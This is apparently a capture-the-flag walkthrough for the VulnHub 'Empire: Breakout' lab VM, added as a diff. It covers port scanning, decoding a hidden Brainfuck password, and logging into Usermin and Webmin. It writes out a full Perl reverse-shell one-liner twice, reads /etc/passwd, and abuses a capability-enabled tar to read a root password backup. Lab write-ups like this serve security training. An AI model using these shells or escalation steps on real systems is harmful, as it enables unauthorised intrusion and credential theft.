@@ -1,0 +1,188 @@
+Writeup for Breakout on https://www.vulnhub.com/entry/empire-breakout,751/
+
+Since I am running this headless, I am going to pull the MAC address of the box I am running from my host:
+
+$> vboxmanage showvminfo vm
+
+This returns my MAC address of 080027D6C6A2
+
+Next, lets jump to Kali and grab the IP address:
+
+$> sudo arp-scan --localnet
+
+10.0.0.158     08:00:27:D6:C6:A2     PCS Systemtechnik GmbH
+
+Ok, so now I have the IP of the target.  Let's scan it:
+
+$> sudo nmap -p 1-65535 -sV -sS -T4 -v 10.0.0.158
+
+PORT      STATE SERVICE     VERSION
+80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
+20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
+MAC Address: 08:00:27:D6:C6:A2 (Oracle VirtualBox virtual NIC)
+
+
+
+Starting off with port 80, nothing running there but a default web server.  Looking at the source, nothing going on; until the very end where we see a comment in BrainFuck:
+
+<!--
+don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
+
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
+
+
+-->
+
+
+Going here, decodes it: https://www.dcode.fr/brainfuck-language
+
+
+.2uqPEfj3D<P'a-3
+
+
+
+Now we are going to do some enumeration.  Running:
+
+$> enum4linux 10.0.0.158
+
+This returns a lot of info, but of particular interest is a username: cyber
+
+
+Now checking out port 10000 and 20000, they are both running on https, and are webmin/usermin portals.
+
+
+https://10.0.0.158:10000
+
+Webmin portal 
+
+MiniServ 1.981 (Webmin httpd)
+
+
+https://10.0.0.158:20000
+
+Usermin portal
+
+MiniServ 1.830 (Webmin httpd)
+
+
+Quick search on 'searchsploit' shows no active vulns for either.
+
+
+Logging into Usermin works:
+
+username: cyber
+password: .2uqPEfj3D<P'a-3
+
+
+Quick look around, there's a command shell.  Easy access.  Time for a reverse shell.
+
+#local machine:
+
+nc -l -p 1111
+
+#target
+
+perl -e 'use Socket;$i="10.0.0.24";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+whoami
+
+$> cyber
+
+
+$> uname -a
+
+Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
+
+
+Looking in the home directory, shows a binary as well: tar
+
+
+$> cat /etc/passwd
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+
+
+
+#Script can be downloaded from here https://github.com/rebootuser/LinEnum
+$> ./LinEnum.sh
+
+Lots of stuff returned, but this pops out:
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root root 17 Oct 20 07:49 /var/backups/.old_pass.bak
+
+
+
+Back in the home directory, we can look at tar a bit closer:
+
+$> getcap tar
+
+$> ls -al
+
+shows that it is owned by root, and can take in any file.
+
+$> ./tar -cf old_pass.tar /var/backups/.old_pass.bak
+$> tar -xf old_pass.tar
+$> cat old_pass.tar
+
+var/backups/.old_pass.bak0000600000000000000000000000002114134001114014303 0ustar  rootrootTs&4&YurgtRX(=~h
+
+
+
+root
+Ts&4&YurgtRX(=~h
+
+
+Jumping over to Webmin now, we can login
+
+
+open command shell
+
+
+#local machine:
+
+nc -l -p 1111
+
+#target
+
+perl -e 'use Socket;$i="10.0.0.24";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+$> whoami
+root
+
+
+$> cat rOOt.txt
+3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
+
+Author: Icex64 & Empire Cybersecurity
